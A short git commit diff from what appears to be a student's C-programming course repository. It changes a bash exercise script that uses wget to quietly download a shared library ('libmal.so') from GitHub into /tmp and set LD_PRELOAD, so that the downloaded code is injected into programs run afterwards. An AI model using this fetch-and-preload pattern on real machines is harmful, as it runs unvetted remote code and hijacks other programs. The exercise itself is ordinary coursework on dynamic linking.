c2828afc26a0acdab41d47369538bbb555f33cd5
Dev Manuels <Emmanuel.umeile@gmail.com>
2023-08-22 17:58:08 +0100

    Ypdate script and payload

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -qO /tmp/liball.so https://github.com/Dev-manuels/alx-low_level_programming/raw/master/0x18-dynamic_libraries/liball.so
-export LD_PRELOAD=/tmp/liball.so
+wget -qO /tmp/libmal.so https://github.com/Dev-manuels/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libmal.so
+export LD_PRELOAD=/tmp/libmal.so
